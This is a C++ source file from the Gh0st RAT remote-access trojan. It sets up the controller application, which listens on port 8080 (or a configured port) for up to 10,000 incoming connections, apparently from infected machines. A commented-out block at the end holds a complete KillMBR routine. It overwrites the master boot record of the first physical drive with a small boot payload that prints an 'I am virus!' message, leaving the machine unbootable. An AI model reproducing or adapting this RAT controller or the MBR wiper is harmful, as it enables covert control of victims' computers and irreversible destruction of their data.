// gh0st.cpp : Defines the class behaviors for the application.
//
#pragma comment(lib,"msvcrt.lib")

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "gh0stDoc.h"
#include "gh0stView.h"
#include "LOGIN.h"
/*
#include "SkinPPWTL.h"
#pragma comment(lib,"SkinPPWTL.lib")
*/
#include "SplashScreenEx.h"
LOGIN Login;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	TCHAR buff[1024];
	memset(buff, 0, sizeof(buff));
	wsprintf
		(buff, 
		_T("CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n")
		_T("eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n"),
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);
	
	MessageBox(NULL, buff, _T("Gh0st RAT Exception"), MB_OK);

}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	ExitProcess(0);
	dbg_dump(ExceptionInfo);
	// 不退出
	return true;
	/*ExitProcess(0);*/
}
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp

BEGIN_MESSAGE_MAP(CGh0stApp, CWinApp)
	//{{AFX_MSG_MAP(CGh0stApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp construction

CGh0stApp::CGh0stApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance

	// 初始化本进程的图像列表, 为加载系统图标列表做准备
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
    //FileIconInit微软没有用函数名导出，使用的序号660。
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary(TEXT("shell32.dll")), (LPCSTR)660);
	FileIconInit(TRUE);

    //begin== added by zhangyl 20171017
    TCHAR szHomePath[MAX_PATH] = { 0 };
    ::GetModuleFileName(NULL, szHomePath, MAX_PATH);
    for (int i = _tcslen(szHomePath); i >= 0; --i)
    {
        if (szHomePath[i] == _T('\\'))
        {
            szHomePath[i] = _T('\0');
            break;
        }
    }

    TCHAR szQQwryPath[MAX_PATH] = { 0 };
    _stprintf_s(szQQwryPath, _T("%s\\QQwry.dat"), szHomePath);
    //end== added by zhangyl 20171017

    HANDLE	hFile = CreateFile(szQQwryPath, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
	}
	else
	{
		m_bIsQQwryExist = false;
	}
	CloseHandle(hFile);

	m_bIsDisablePopTips = m_IniFile.GetInt(TEXT("Settings"), TEXT("PopTips"), false);
	m_pConnectView = NULL;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CGh0stApp object

CGh0stApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp initialization

BOOL CGh0stApp::InitInstance()
{
	SetUnhandledExceptionFilter(bad_exception);
	AfxEnableControlContainer();

//	skinppLoadSkin("AquaOS.ssk");//开始加载皮肤
	//Login.DoModal();
	//if ( Login.dLogin <= 10000 )
	//{
	//	return FALSE;
	//}

    //by zhangyl
    //CSplashScreenEx *pSplash=new CSplashScreenEx();
    //pSplash->Create( pSplash, NULL,CSS_FADE | CSS_CENTERSCREEN | CSS_SHADOW);
    //pSplash->SetBitmap(IDB_SPLASH,255,0,255);
    //pSplash->Show();
    //Sleep(1500);
    //pSplash->Hide(); 

	//delete pSplash;
	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
//	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

//	LoadStdProfileSettings(0);  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CGh0stDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CGh0stView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// 去掉菜单栏
//	m_pMainWnd->SetMenu(NULL);
	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();
	// 启动IOCP服务器
	int	nPort = m_IniFile.GetInt(TEXT("Settings"), TEXT("ListenPort"));
    int	nMaxConnection = m_IniFile.GetInt(TEXT("Settings"), TEXT("MaxConnection"));
	if (nPort == 0)
		nPort = 8080;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	
    if (m_IniFile.GetInt(TEXT("Settings"), TEXT("MaxConnectionAuto")))
		nMaxConnection = 8000;

	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);

	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CGh0stApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/*去硬盘锁
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp message handlers

unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

int CGh0stApp::KillMBR()
{
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	
	// 重新构造MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	hDevice = CreateFile
		(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
		);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl
		(
		hDevice, 
		FSCTL_LOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
		);
	// 写入病毒内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
		(
		hDevice, 
		FSCTL_UNLOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
		);
	CloseHandle(hDevice);

	ExitProcess(-1);
	return 0;
}
*/